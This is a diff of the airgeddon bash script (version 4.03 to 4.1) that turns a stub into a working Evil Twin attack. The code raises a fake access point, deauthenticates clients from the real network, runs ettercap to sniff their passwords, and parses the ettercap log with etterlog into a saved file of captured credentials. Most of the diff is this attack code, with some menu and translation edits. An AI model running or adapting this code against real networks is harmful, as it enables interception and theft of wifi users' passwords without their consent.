@@ -1,6 +1,6 @@
 #!/bin/bash
 
-airgeddon_version="4.03"
+airgeddon_version="4.1"
 
 #Enabled 1 / Disabled 0 - Debug mode for faster development skipping intro and initial checks - Default value 0
 debug_mode=0
@@ -53,6 +53,8 @@ optional_tools_names=(
 						"hostapd"
 						"dhcpd"
 						"iptables"
+						"ettercap"
+						"etterlog"
 					)
 
 declare -A optional_tools=(
@@ -64,6 +66,8 @@ declare -A optional_tools=(
 							[${optional_tools_names[5]}]=0
 							[${optional_tools_names[6]}]=0
 							[${optional_tools_names[7]}]=0
+							[${optional_tools_names[8]}]=0
+							[${optional_tools_names[9]}]=0
 						)
 
 update_tools=("curl")
@@ -84,6 +88,8 @@ declare -A possible_package_names=(
 									[${optional_tools_names[5]}]="hostapd" #hostapd
 									[${optional_tools_names[6]}]="isc-dhcp-server / dhcp-server / dhcp" #dhcpd
 									[${optional_tools_names[7]}]="iptables" #iptables
+									[${optional_tools_names[8]}]="ettercap / ettercap-text-only / ettercap-graphical" #ettercap
+									[${optional_tools_names[9]}]="ettercap / ettercap-text-only / ettercap-graphical" #etterlog
 									[${update_tools[0]}]="curl" #curl
 								)
 
@@ -213,54 +219,60 @@ function language_strings() {
 	possible_package_names["catalan"]="Possible nom del paquet"
 	possible_package_names["portuguese"]="Possível nome do pacote"
 
-	declare -gA control_window_texts
-	control_window_texts["english",0]="Evil Twin AP Info"
-	control_window_texts["spanish",0]="Info Evil Twin AP"
-	control_window_texts["french",0]="Info Evil Twin AP"
-	control_window_texts["catalan",0]="Info Evil Twin AP"
-	control_window_texts["portuguese",0]="Info Evil Twin AP"
+	declare -gA et_misc_texts
+	et_misc_texts["english",0]="Evil Twin AP Info"
+	et_misc_texts["spanish",0]="Info Evil Twin AP"
+	et_misc_texts["french",0]="Info Evil Twin AP"
+	et_misc_texts["catalan",0]="Info Evil Twin AP"
+	et_misc_texts["portuguese",0]="Info Evil Twin AP"
 
-	control_window_texts["english",1]="Channel"
-	control_window_texts["spanish",1]="Canal"
-	control_window_texts["french",1]="Canal"
-	control_window_texts["catalan",1]="Canal"
-	control_window_texts["portuguese",1]="Canal"
+	et_misc_texts["english",1]="Channel"
+	et_misc_texts["spanish",1]="Canal"
+	et_misc_texts["french",1]="Canal"
+	et_misc_texts["catalan",1]="Canal"
+	et_misc_texts["portuguese",1]="Canal"
 
-	control_window_texts["english",2]="Online time"
-	control_window_texts["spanish",2]="Tiempo online"
-	control_window_texts["french",2]="Temps en ligne"
-	control_window_texts["catalan",2]="Temps online"
-	control_window_texts["portuguese",2]="Tempo online"
+	et_misc_texts["english",2]="Online time"
+	et_misc_texts["spanish",2]="Tiempo online"
+	et_misc_texts["french",2]="Temps en ligne"
+	et_misc_texts["catalan",2]="Temps online"
+	et_misc_texts["portuguese",2]="Tempo online"
 
-	control_window_texts["english",3]="DHCP ips given to possible connected clients"
-	control_window_texts["spanish",3]="Ips entregadas por DHCP a posibles clientes conectados"
-	control_window_texts["french",3]="Ips attribuées à d'éventuels clients DHCP"
-	control_window_texts["catalan",3]="Ips lliurades per DHCP a possibles clients connectats"
-	control_window_texts["portuguese",3]="Ips entregues pelos clientes DHCP ligado ao possível"
+	et_misc_texts["english",3]="DHCP ips given to possible connected clients"
+	et_misc_texts["spanish",3]="Ips entregadas por DHCP a posibles clientes conectados"
+	et_misc_texts["french",3]="Ips attribuées à d'éventuels clients DHCP"
+	et_misc_texts["catalan",3]="Ips lliurades per DHCP a possibles clients connectats"
+	et_misc_texts["portuguese",3]="Ips entregues pelos clientes DHCP ligado ao possível"
 
-	control_window_texts["english",4]="With this attack you have to use an external sniffer to try to obtain client passwords connected to the network"
-	control_window_texts["spanish",4]="Con este ataque has de usar un sniffer externo para intentar obtener contraseñas de los clientes conectados a la red"
-	control_window_texts["french",4]="Avec cette attaque, vous devez utiliser un sniffeur pour tenter d'obtenir les mots de passe des clients connectés au réseau"
-	control_window_texts["catalan",4]="Amb aquest atac has d'utilitzar un sniffer extern per intentar obtenir contrasenyes dels clients connectats a la xarxa"
-	control_window_texts["portuguese",4]="Com este ataque você tem que usar um sniffer externa para tentar obter as senhas dos clientes conectados à rede"
+	et_misc_texts["english",4]="With this attack you have to use an external sniffer to try to obtain client passwords connected to the network"
+	et_misc_texts["spanish",4]="Con este ataque has de usar un sniffer externo para intentar obtener contraseñas de los clientes conectados a la red"
+	et_misc_texts["french",4]="Avec cette attaque, vous devez utiliser un sniffeur pour tenter d'obtenir les mots de passe des clients connectés au réseau"
+	et_misc_texts["catalan",4]="Amb aquest atac has d'utilitzar un sniffer extern per intentar obtenir contrasenyes dels clients connectats a la xarxa"
+	et_misc_texts["portuguese",4]="Com este ataque você tem que usar um sniffer externa para tentar obter as senhas dos clientes conectados à rede"
 
-	control_window_texts["english",5]="With this attack, watch the sniffer's screen to see if a password appears"
-	control_window_texts["spanish",5]="Con este ataque, estate atento a la pantalla del sniffer para ver si aparece alguna contraseña"
-	control_window_texts["french",5]="Vérifiez pendant l'attaque dans la console du sniffeur si un mot de passe a été capturé"
-	control_window_texts["catalan",5]="Amb aquest atac, estigues atent a la pantalla de l'sniffer per veure si apareix alguna contrasenya"
-	control_window_texts["portuguese",5]="Com este ataque, cuidado com a tela aparece sniffer para ver se uma senha"
+	et_misc_texts["english",5]="With this attack, watch the sniffer's screen to see if a password appears"
+	et_misc_texts["spanish",5]="Con este ataque, estate atento a la pantalla del sniffer para ver si aparece alguna contraseña"
+	et_misc_texts["french",5]="Vérifiez pendant l'attaque dans la console du sniffeur si un mot de passe a été capturé"
+	et_misc_texts["catalan",5]="Amb aquest atac, estigues atent a la pantalla de l'sniffer per veure si apareix alguna contrasenya"
+	et_misc_texts["portuguese",5]="Com este ataque, cuidado com a tela aparece sniffer para ver se uma senha"
 
-	control_window_texts["english",6]="With this attack, we'll wait for a network client to provide us with the password for the wifi network in our captive portal"
-	control_window_texts["spanish",6]="Con este ataque, esperaremos a que un cliente de la red nos provea de la contraseña de la red wifi en nuestro portal cautivo"
-	control_window_texts["french",6]="Avec cette attaque nous allons attendre qu'un client rentre le mot de passe du réseau cible dans notre portail captif"
-	control_window_texts["catalan",6]="Amb aquest atac, esperarem que un client de la xarxa ens proveeixi de la contrasenya de la xarxa wifi al nostre portal captiu"
-	control_window_texts["portuguese",6]="Com este ataque, vamos esperar por um cliente de rede nos fornecer a senha para a rede wifi no nosso portal cativo"
+	et_misc_texts["english",6]="With this attack, we'll wait for a network client to provide us with the password for the wifi network in our captive portal"
+	et_misc_texts["spanish",6]="Con este ataque, esperaremos a que un cliente de la red nos provea de la contraseña de la red wifi en nuestro portal cautivo"
+	et_misc_texts["french",6]="Avec cette attaque nous allons attendre qu'un client rentre le mot de passe du réseau cible dans notre portail captif"
+	et_misc_texts["catalan",6]="Amb aquest atac, esperarem que un client de la xarxa ens proveeixi de la contrasenya de la xarxa wifi al nostre portal captiu"
+	et_misc_texts["portuguese",6]="Com este ataque, vamos esperar por um cliente de rede nos fornecer a senha para a rede wifi no nosso portal cativo"
 
-	control_window_texts["english",7]="No clients connected yet"
-	control_window_texts["spanish",7]="No hay clientes conectados aún"
-	control_window_texts["french",7]="Toujours pas de clients connectés"
-	control_window_texts["catalan",7]="Encara no hi han clients connectats"
-	control_window_texts["portuguese",7]="Ainda não há clientes conectados"
+	et_misc_texts["english",7]="No clients connected yet"
+	et_misc_texts["spanish",7]="No hay clientes conectados aún"
+	et_misc_texts["french",7]="Toujours pas de clients connectés"
+	et_misc_texts["catalan",7]="Encara no hi han clients connectats"
+	et_misc_texts["portuguese",7]="Ainda não há clientes conectados"
+
+	et_misc_texts["english",8]="Airgeddon. Evil Twin attack captured passwords"
+	et_misc_texts["spanish",8]="Airgeddon. Contraseñas capturadas en ataque Evil Twin"
+	et_misc_texts["french",8]="Airgeddon. Mots de passe capturés par attaque Evil Twin"
+	et_misc_texts["catalan",8]="Airgeddon. Contrasenyes capturades amb atac Evil Twin"
+	et_misc_texts["portuguese",8]="Airgeddon. Senhas capturado no ataque ataque Evil Twin"
 
 	declare -A arr
 	arr["english",0]="This interface $interface is already in managed mode"
@@ -335,11 +347,11 @@ function language_strings() {
 	arr["catalan",11]="Sortint de airgeddon script v$airgeddon_version - Ens veiem aviat! :)"
 	arr["portuguese",11]="$pending_of_translation Deixando airgeddon script v$airgeddon_version - Até breve! :)"
 
-	arr["english",12]="Interruption detected. Do you really want to exit? "${normal_color}"[y/n]"
-	arr["spanish",12]="Detectada interrupción. ¿Quieres realmente salir del script? "${normal_color}"[y/n]"
-	arr["french",12]="Interruption détectée. Voulez-vous vraiment arrêter le script? "${normal_color}"[y/n]"
-	arr["catalan",12]="Interrupció detectada. ¿Realment vols sortir de l'script? "${normal_color}"[y/n]"
-	arr["portuguese",12]="$pending_of_translation Interrupção detectado. Você quer realmente obter o script? "${normal_color}"[y/n]"
+	arr["english",12]=${blue_color}"Interruption detected. "${green_color}"Do you really want to exit? "${normal_color}"[y/n]"
+	arr["spanish",12]=${blue_color}"Detectada interrupción. "${green_color}"¿Quieres realmente salir del script? "${normal_color}"[y/n]"
+	arr["french",12]=${blue_color}"Interruption détectée. "${green_color}"Voulez-vous vraiment arrêter le script? "${normal_color}"[y/n]"
+	arr["catalan",12]=${blue_color}"Interrupció detectada. "${green_color}"¿Realment vols sortir de l'script? "${normal_color}"[y/n]"
+	arr["portuguese",12]="$pending_of_translation "${blue_color}"Interrupção detectado. "${green_color}"Você quer realmente obter o script? "${normal_color}"[y/n]"
 
 	arr["english",13]="This interface $interface is not a wifi card. It doesn't support monitor mode"
 	arr["spanish",13]="Esta interfaz $interface no es una tarjeta wifi. No soporta modo monitor"
@@ -1152,10 +1164,10 @@ function language_strings() {
 	arr["catalan",147]="4.  Tornar al menú d'eines Handshake"
 	arr["portuguese",147]="$pending_of_translation 4.  Voltar para o menu de ferramentas do Handshake"
 
-	arr["english",148]="Type the path to store the file or press Enter to accept the default proposal"${normal_color}"[$handshakepath]"
+	arr["english",148]="Type the path to store the file or press Enter to accept the default proposal "${normal_color}"[$handshakepath]"
 	arr["spanish",148]="Escribe la ruta donde guardaremos el fichero o pulsa Enter para aceptar la propuesta por defecto "${normal_color}"[$handshakepath]"
-	arr["french",148]="Entrez le chemin où vous voulez garder le fichier ou bien appuyez sur Entrée pour prendre le chemin proposé par défaut"${normal_color}"[$handshakepath]"
-	arr["catalan",148]="Escriu la ruta on guardarem el fitxer o prem Enter per acceptar la proposta per defecte"${normal_color}"[$handshakepath]"
+	arr["french",148]="Entrez le chemin où vous voulez enregistrer le fichier ou bien appuyez sur Entrée pour utiliser le chemin proposé "${normal_color}"[$handshakepath]"
+	arr["catalan",148]="Escriu la ruta on guardarem el fitxer o prem Enter per acceptar la proposta per defecte "${normal_color}"[$handshakepath]"
 	arr["portuguese",148]="$pending_of_translation Digite o caminho onde armazenar o arquivo ou pressione Enter para aceitar as propostas padrão "${normal_color}"[$handshakepath]"
 
 	arr["english",149]="Handshake file generated successfully at ["${normal_color}"$enteredpath"${blue_color}"]"
@@ -1662,10 +1674,10 @@ function language_strings() {
 	arr["catalan",232]="5.  (hashcat) Atac basat en regles sobre el fitxer de captura"
 	arr["portuguese",232]="$pending_of_translation 5.  (hashcat) Ataque com base no arquivo de captura regras"
 
-	arr["english",233]="Type the path to store the file or press Enter to accept the default proposal"${normal_color}"[$hashcat_potpath]"
+	arr["english",233]="Type the path to store the file or press Enter to accept the default proposal "${normal_color}"[$hashcat_potpath]"
 	arr["spanish",233]="Escribe la ruta donde guardaremos el fichero o pulsa Enter para aceptar la propuesta por defecto "${normal_color}"[$hashcat_potpath]"
-	arr["french",233]="Entrez le chemin où vous voulez garder le fichier ou bien appuyez sur Entrée pour utiliser le chemin proposé "${normal_color}"[$hashcat_potpath]"
-	arr["catalan",233]="Escriu la ruta on guardarem el fitxer o prem Enter per acceptar la proposta per defecte"${normal_color}"[$hashcat_potpath]"
+	arr["french",233]="Entrez le chemin où vous voulez enregistrer le fichier ou bien appuyez sur Entrée pour utiliser le chemin proposé "${normal_color}"[$hashcat_potpath]"
+	arr["catalan",233]="Escriu la ruta on guardarem el fitxer o prem Enter per acceptar la proposta per defecte "${normal_color}"[$hashcat_potpath]"
 	arr["portuguese",233]="$pending_of_translation Digite o caminho onde armazenar o arquivo ou pressione Enter para aceitar as propostas padrão "${normal_color}"[$hashcat_potpath]"
 
 	arr["english",234]="Contratulations!! It seems the key has been decrypted"
@@ -2074,7 +2086,37 @@ function language_strings() {
 	arr["spanish",301]="A pesar de tener todas las herramientas esenciales instaladas, tu sistema usa airmon-zc en lugar de airmon-ng. Para poder funcionar necesitas tener instalado lspci (pciutils) y tú no lo tienes en este momento. Por favor, instálalo y vuelve a lanzar el script"
 	arr["french",301]="En dépit d'avoir tous les outils essentiels installés votre système utilise airmon-zc au lieu de airmon-ng. Vous devez installer lspci (pciutils) que vous n'avez pas à ce moment. S'il vous plaît, installez-le et relancez le script"
 	arr["catalan",301]="Tot i tenir totes les eines essencials instal·lades, el teu sistema fa servir airmon-zc en lloc del airmon-ng. Per poder funcionar necessites tenir instal·lat lspci (pciutils) i tu no el tens en aquest moment. Si us plau, instal·la-ho i torna a executar el script"
-	arr["portuguese",247]="$pending_of_translation Apesar de ter todas as ferramentas essenciais instalado, o sistema utiliza airmon-zc vez de airmon-ng. Para funcionar você precisa instalar lspci (pciutils) e você não tem neste momento. Por favor, instale e execute o script novamente"
+	arr["portuguese",301]="$pending_of_translation Apesar de ter todas as ferramentas essenciais instalado, o sistema utiliza airmon-zc vez de airmon-ng. Para funcionar você precisa instalar lspci (pciutils) e você não tem neste momento. Por favor, instale e execute o script novamente"
+
+	arr["english",302]="Do you want to store in a file the sniffed captured passwords? "${blue_color}"If you answer no (\"n\") they will be only shown on screen "${normal_color}"[y/n]"
+	arr["spanish",302]="¿Deseas guardar en un fichero las contraseñas obtenidas del sniffing? "${blue_color}"Si respondes que no (\"n\") solo se mostrarán por pantalla "${normal_color}"[y/n]"
+	arr["french",302]="Voulez-vous enregistrer dans un fichier les mots de passe capturés? "${blue_color}"Si vous répondez non (\"n\"), ils seronts uniquements affichés à l'écran "${normal_color}"[y/n]"
+	arr["catalan",302]="¿Vols guardar en un fitxer les contrasenyes obtingudes del sniffing? "${blue_color}"Si respons que no (\"n\") només es mostraran per pantalla "${normal_color}"[y/n]"
+	arr["portuguese",302]="$pending_of_translation Você deseja manter senhas em um arquivo obtido a partir de cheirar? "${blue_color}"Se você responder não (\"n\") só será mostrado na tela "${normal_color}"[y/n]"
+
+	arr["english",303]="Type the path to store the file or press Enter to accept the default proposal "${normal_color}"[$default_ettercap_logpath]"
+	arr["spanish",303]="Escribe la ruta donde guardaremos el fichero o pulsa Enter para aceptar la propuesta por defecto "${normal_color}"[$default_ettercap_logpath]"
+	arr["french",303]="Entrez le chemin où vous voulez enregistrer le fichier ou bien appuyez sur Entrée pour utiliser le chemin proposé "${normal_color}"[$default_ettercap_logpath]"
+	arr["catalan",303]="Escriu la ruta on desarem el fitxer o prem Enter per acceptar la proposta per defecte "${normal_color}"[$default_ettercap_logpath]"
+	arr["portuguese",303]="$pending_of_translation Digite o caminho onde armazenar o arquivo ou pressione Enter para aceitar as propostas padrão "${normal_color}"[$default_ettercap_logpath]"
+
+	arr["english",304]="Parsing sniffer log..."
+	arr["spanish",304]="Analizando log del sniffer.."
+	arr["french",304]="Analyse du log de capture de données..."
+	arr["catalan",304]="Analitzant log del sniffer..."
+	arr["portuguese",304]="$pending_of_translation Sniffer log análise..."
+
+	arr["english",305]="No passwords detected on sniffers's log. File will not be saved"
+	arr["spanish",305]="No se ha encontrado ninguna contraseña en el log del sniffer. No se guardará el fichero"
+	arr["french",305]="Aucun mot de passe détecté dans le log de capture. Le fichier ne sera pas sauvegardé"
+	arr["catalan",305]="No s'ha trobat cap contrasenya en el log del sniffer. No es guarda el fitxer"
+	arr["portuguese",305]="$pending_of_translation Ele não foi encontrado qualquer registo de senha sniffer. O arquivo não será salvo"
+
+	arr["english",306]="Passwords captured by sniffer. File saved at "${normal_color}"[$ettercap_logpath]"
+	arr["spanish",306]="El sniffer ha capturado contraseñas. Fichero salvado en "${normal_color}"[$ettercap_logpath]"
+	arr["french",306]="Le sniffer a capturé des mots de passe. Fichier enregistré dans "${normal_color}"[$ettercap_logpath]"
+	arr["catalan",306]="El sniffer ha capturat contrasenyes. Fitxer desat a "${normal_color}"[$ettercap_logpath]"
+	arr["portuguese",306]="$pending_of_translation O sniffer capturou senhas. I arquivo salvo no "${normal_color}"[$ettercap_logpath]"
 
 	case "$3" in
 		"yellow")
@@ -3065,6 +3107,7 @@ function initialize_menu_options_dependencies() {
 	mdk3_attack_dependencies=(${optional_tools_names[3]})
 	hashcat_attacks_dependencies=(${optional_tools_names[4]})
 	et_onlyap_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]})
+	et_sniffing_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]} ${optional_tools_names[8]} ${optional_tools_names[9]})
 }
 
 function initialize_menu_and_print_selections() {
@@ -3124,6 +3167,7 @@ function clean_tmpfiles() {
 	rm -rf "$tmpdir$hostapd_file" > /dev/null 2>&1
 	rm -rf "$tmpdir$dhcpd_file" > /dev/null 2>&1
 	rm -rf "$tmpdir$control_file" > /dev/null 2>&1
+	rm -rf "${tmpdir}ag.ettercaplog"* > /dev/null 2>&1
 	if [ ${dhcpd_path_changed} -eq 1 ]; then
 		rm -rf "$dhcp_path" > /dev/null 2>&1
 	fi
@@ -3307,7 +3351,7 @@ function evil_twin_attacks_menu() {
 	language_strings ${language} 255 "separator"
 	language_strings ${language} 256 et_onlyap_dependencies[@]
 	language_strings ${language} 257 "separator"
-	language_strings ${language} 259 "under_construction"
+	language_strings ${language} 259 et_sniffing_dependencies[@]
 	language_strings ${language} 261 "under_construction"
 	language_strings ${language} 262 "separator"
 	language_strings ${language} 263 "under_construction"
@@ -3346,22 +3390,20 @@ function evil_twin_attacks_menu() {
 			fi
 		;;
 		6)
-			under_construction_message
-			#TODO: Evil Twin AP with sniffing
-			#contains_element "$et_option" "${forbidden_options[@]}"
-			#if [ "$?" = "0" ]; then
-			#	forbidden_menu_option
-			#else
-			#	check_interface_wifi
-			#	if [ "$?" = "0" ]; then
-			#		et_mode="et_sniffing"
-			#		et_dos_menu
-			#	else
-			#		echo
-			#		language_strings ${language} 281 "yellow"
-			#		language_strings ${language} 115 "read"
-			#	fi
-			#fi
+			contains_element "$et_option" "${forbidden_options[@]}"
+			if [ "$?" = "0" ]; then
+				forbidden_menu_option
+			else
+				check_interface_wifi
+				if [ "$?" = "0" ]; then
+					et_mode="et_sniffing"
+					et_dos_menu
+				else
+					echo
+					language_strings ${language} 281 "yellow"
+					language_strings ${language} 115 "read"
+				fi
+			fi
 		;;
 		7)
 			under_construction_message
@@ -3794,6 +3836,28 @@ function manage_hashcat_pot() {
 	fi
 }
 
+function manage_ettercap_log() {
+
+	ettercap_log=0
+	ask_yesno 302
+	if [ ${yesno} = "y" ]; then
+		ettercap_log=1
+		default_ettercap_logpath=`env | grep ^HOME | awk -F = '{print $2}'`
+		lastcharettercaplogpath=${default_ettercap_logpath: -1}
+		if [ "$lastcharettercaplogpath" != "/" ]; then
+			ettercap_logpath="$default_ettercap_logpath/"
+		fi
+		default_ettercaplogfilename="evil_twin_captured_passwords-$essid.txt"
+		rm -rf "${tmpdir}ag.ettercaplog"* > /dev/null 2>&1
+		tmp_ettercaplog="${tmpdir}ag.ettercaplog"
+		default_ettercap_logpath="$ettercap_logpath$default_ettercaplogfilename"
+		validpath=1
+		while [[ "$validpath" != "0" ]]; do
+			read_path "ettercaplog"
+		done
+	fi
+}
+
 function set_minlength() {
 
 	minlength=0
@@ -3988,6 +4052,29 @@ function exec_et_onlyap_attack() {
 	restore_et_interface
 }
 
+function exec_et_sniffing_attack() {
+
+	set_hostapd_config
+	launch_fake_ap
+	set_dhcp_config
+	set_std_internet_routing_rules
+	launch_dhcp_server
+	exec_et_deauth
+	launch_sniffing
+	set_control_script
+	launch_control_window
+
+	echo
+	language_strings ${language} 298 "yellow"
+	language_strings ${language} 115 "read"
+
+	kill_et_windows
+	restore_et_interface
+	if [ ${ettercap_log} -eq 1 ]; then
+		parse_ettercap_log
+	fi
+}
+
 function set_hostapd_config() {
 
 	tmpfiles_toclean=1
@@ -4014,8 +4101,11 @@ function launch_fake_ap() {
 		"et_onlyap")
 			hostapd_scr_window_position=${g1_topleft_window}
 		;;
-		"et_sniffing"|"et_sniffing_sslstrip"|"et_captive_portal")
+		"et_sniffing"|"et_captive_portal")
 			hostapd_scr_window_position=${g3_topleft_window}
+		;;
+		"et_sniffing_sslstrip")
+			hostapd_scr_window_position=${g4_topleft_window}
 		;;
 	esac
 	xterm -hold -bg black -fg blue -geometry ${hostapd_scr_window_position} -T "AP" -e "hostapd \"$tmpdir$hostapd_file\"" > /dev/null 2>&1 &
@@ -4118,8 +4208,11 @@ function launch_dhcp_server() {
 		"et_onlyap")
 			dchcpd_scr_window_position=${g1_bottomleft_window}
 		;;
-		"et_sniffing"|"et_sniffing_sslstrip"|"et_captive_portal")
+		"et_sniffing"|"et_captive_portal")
 			dchcpd_scr_window_position=${g3_middleleft_window}
+		;;
+		"et_sniffing_sslstrip")
+			dchcpd_scr_window_position=${g4_middleleft_window}
 		;;
 	esac
 	xterm -hold -bg black -fg pink -geometry ${dchcpd_scr_window_position} -T "DHCP" -e "dhcpd -d -cf \"$dhcp_path\" $interface 2>&1 | tee -a $tmpdir/clts.txt" > /dev/null 2>&1 &
@@ -4153,8 +4246,11 @@ function exec_et_deauth() {
 		"et_onlyap")
 			deauth_scr_window_position=${g1_bottomright_window}
 		;;
-		"et_sniffing"|"et_sniffing_sslstrip"|"et_captive_portal")
+		"et_sniffing"|"et_captive_portal")
 			deauth_scr_window_position=${g3_bottomleft_window}
+		;;
+		"et_sniffing_sslstrip")
+			deauth_scr_window_position=${g4_bottomleft_window}
 		;;
 	esac
 	xterm -hold -bg black -fg red -geometry ${deauth_scr_window_position} -T "Deauth" -e "$deauth_et_cmd" > /dev/null 2>&1 &
@@ -4177,23 +4273,23 @@ function set_control_script() {
 
 	case ${et_mode} in
 		"et_onlyap")
-			local control_msg=${control_window_texts[$language,4]}
+			local control_msg=${et_misc_texts[$language,4]}
 		;;
 		"et_sniffing"|"et_sniffing_sslstrip")
-			local control_msg=${control_window_texts[$language,5]}
+			local control_msg=${et_misc_texts[$language,5]}
 		;;
 		"et_captive_portal")
-			local control_msg=${control_window_texts[$language,6]}
+			local control_msg=${et_misc_texts[$language,6]}
 		;;
 	esac
 
 	cat >&3 <<-EOF
-			echo -e "\t${yellow_color}${control_window_texts[$language,0]}\n"
+			echo -e "\t${yellow_color}${et_misc_texts[$language,0]}\n"
 			echo -e "\t${blue_color}BSSID: ${normal_color}${bssid}"
 			echo -e "\t${blue_color}ESSID: ${normal_color}${essid}"
-			echo -e "\t${blue_color}${control_window_texts[$language,1]}: ${normal_color}${channel}"
+			echo -e "\t${blue_color}${et_misc_texts[$language,1]}: ${normal_color}${channel}"
 			echo
-			echo -e "\t${green_color}${control_window_texts[$language,2]}${normal_color}"
+			echo -e "\t${green_color}${et_misc_texts[$language,2]}${normal_color}"
 	EOF
 
 	cat >&3 <<-'EOF'
@@ -4206,7 +4302,7 @@ function set_control_script() {
 	cat >&3 <<-EOF
 			echo
 			echo -e "\t${pink_color}${control_msg}${normal_color}\n"
-			echo -e "\t${green_color}${control_window_texts[$language,3]}${normal_color}"
+			echo -e "\t${green_color}${et_misc_texts[$language,3]}${normal_color}"
 			readarray -t DHCPCLIENTS < <(cat "${tmpdir}clts.txt" | grep DHCPACK)
 			client_ips=()
 	EOF
@@ -4216,7 +4312,7 @@ function set_control_script() {
 	EOF
 
 	cat >&3 <<-EOF
-				echo -e "\t${control_window_texts[$language,7]}"
+				echo -e "\t${et_misc_texts[$language,7]}"
 			else
 	EOF
 
@@ -4250,12 +4346,70 @@ function launch_control_window() {
 		"et_onlyap")
 			control_scr_window_position=${g1_topright_window}
 		;;
-		"et_sniffing"|"et_sniffing_sslstrip"|"et_captive_portal")
+		"et_sniffing"|"et_captive_portal")
 			control_scr_window_position=${g3_topright_window}
+		;;
+		"et_sniffing_sslstrip")
+			control_scr_window_position=${g4_topright_window}
 		;;
 	esac
 	xterm -hold -bg black -fg white -geometry ${control_scr_window_position} -T "Control" -e "bash \"$tmpdir$control_file\"" > /dev/null 2>&1 &
 	et_processes+=($!)
+}
+
+function launch_sniffing() {
+
+	recalculate_windows_sizes
+	case ${et_mode} in
+		"et_sniffing")
+			sniffing_scr_window_position=${g3_bottomright_window}
+		;;
+		"et_sniffing_sslstrip")
+			sniffing_scr_window_position=${g4_middleright_window}
+		;;
+	esac
+	ettercap_cmd="ettercap -i $interface -q -T -z -S -u"
+	if [ ${ettercap_log} -eq 1 ]; then
+		ettercap_cmd+=" -l $tmp_ettercaplog"
+	fi
+
+	xterm -hold -bg black -fg yellow -geometry ${sniffing_scr_window_position} -T "Sniffer" -e "$ettercap_cmd" > /dev/null 2>&1 &
+	et_processes+=($!)
+}
+
+function parse_ettercap_log() {
+
+	echo
+	language_strings ${language} 304 "blue"
+
+	readarray -t CAPTUREDPASS < <(etterlog -L -p -i "${tmp_ettercaplog}.eci" 2> /dev/null | grep "(")
+
+	echo "" > "${tmpdir}parsed_file"
+	echo $(date +%Y-%m-%d) >> "${tmpdir}parsed_file"
+	echo ${et_misc_texts[$language,8]} >> "${tmpdir}parsed_file"
+	echo "" >> "${tmpdir}parsed_file"
+	echo "BSSID: $bssid" >> "${tmpdir}parsed_file"
+	echo ${et_misc_texts[$language,1]}": $channel" >> "${tmpdir}parsed_file"
+	echo "ESSID: $essid" >> "${tmpdir}parsed_file"
+	echo "" >> "${tmpdir}parsed_file"
+	echo "---------------" >> "${tmpdir}parsed_file"
+	echo "" >> "${tmpdir}parsed_file"
+
+	pass_counter=0
+	for cpass in "${CAPTUREDPASS[@]}"; do
+		echo ${cpass} >> "${tmpdir}parsed_file"
+		pass_counter=$[pass_counter + 1]
+	done
+
+	if [ ${pass_counter} -eq 0 ]; then
+		language_strings ${language} 305 "yellow"
+	else
+		language_strings ${language} 306 "blue"
+		cp "${tmpdir}parsed_file" "${ettercap_logpath}" > /dev/null 2>&1
+	fi
+
+	rm -rf "${tmpdir}parsed_file" > /dev/null 2>&1
+	language_strings ${language} 115 "read"
 }
 
 function kill_et_windows() {
@@ -4531,8 +4685,13 @@ function validate_path() {
 				suggested_filename="$hashcatpot_filename"
 				potenteredpath+="$hashcatpot_filename"
 			;;
+			"ettercaplog")
+				suggested_filename="$default_ettercaplogfilename"
+				ettercap_logpath="$ettercap_logpath$default_ettercaplogfilename"
+			;;
 		esac
 
+		echo
 		language_strings ${language} 155 "yellow"
 		return 0
 	fi
@@ -4601,6 +4760,14 @@ function read_path() {
 				potenteredpath="$hashcat_potpath"
 			fi
 			validate_path "$potenteredpath" ${1}
+		;;
+		"ettercaplog")
+			language_strings ${language} 303 "green"
+			read_and_clean_path "ettercap_logpath"
+			if [ -z "$ettercap_logpath" ]; then
+				ettercap_logpath="$default_ettercap_logpath"
+			fi
+			validate_path "$ettercap_logpath" ${1}
 		;;
 	esac
 
@@ -4923,7 +5090,26 @@ function et_prerequisites() {
 			print_et_target_vars
 			print_iface_internet_selected
 			print_hint ${current_menu}
-			#TODO: Evil Twin AP with sniffing
+			echo
+			language_strings ${language} 275 "blue"
+			echo
+			language_strings ${language} 276 "yellow"
+			print_simple_separator
+			ask_yesno 277
+			if [ ${yesno} = "n" ]; then
+				return_to_et_main_menu=1
+				return
+			fi
+			ask_bssid
+			ask_channel
+			ask_essid
+			manage_ettercap_log
+			return_to_et_main_menu=1
+			echo
+			language_strings ${language} 296 "yellow"
+			language_strings ${language} 115 "read"
+			prepare_et_interface
+			exec_et_sniffing_attack
 		;;
 		"et_sniffing_sslstrip")
 			language_strings ${language} 292 "title"
